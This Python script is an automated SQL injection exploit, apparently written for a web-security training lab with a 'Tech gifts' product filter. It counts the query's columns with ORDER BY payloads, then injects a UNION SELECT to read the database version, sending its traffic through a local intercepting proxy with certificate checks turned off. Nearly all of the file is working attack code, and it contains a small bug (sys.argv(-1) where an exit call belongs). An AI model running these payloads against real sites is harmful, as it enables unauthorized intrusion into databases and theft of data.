import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_col_num(url):
    path="/filter?category=Tech+gifts"
    for i in range(1,10):
        sql_payload="'+ORDER+BY+%s-- -"%i
        r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
        res=r.text
        if "Internal Server Error" in res:
            return i-1
    return False    

def exploit_sqli_version(url,col_num):
    path="/filter?category=Tech+gifts"
    sql_payload="'%20UNION%20SELECT%20NULL%2c%40%40version--%20-"
    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    res=r.text
    soup=BeautifulSoup(res,'html.parser')
    #find the td tag
    td_tag=soup.find('td')
    #extract the text from the tag
    if td_tag:
        version=td_tag.next #td tag paxi ko next find garcha
        return version
    else:
        print("No td tag found")
    



if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
        
    except IndexError: 
        print("[-]Usage %s <url>" % sys.argv[0])   
        print("[-]Example %s www.example.com" % sys.argv[0]) 
        sys.argv(-1) 
    col_num=exploit_col_num(url)
    if col_num:
        print(f"[+]The column in this database is:{col_num}")
        sqli_version=exploit_sqli_version(url,col_num)
        if sqli_version:
            print(f"[+]The version is: {sqli_version}")    
    else:
        print("[-]Could not find the column")    
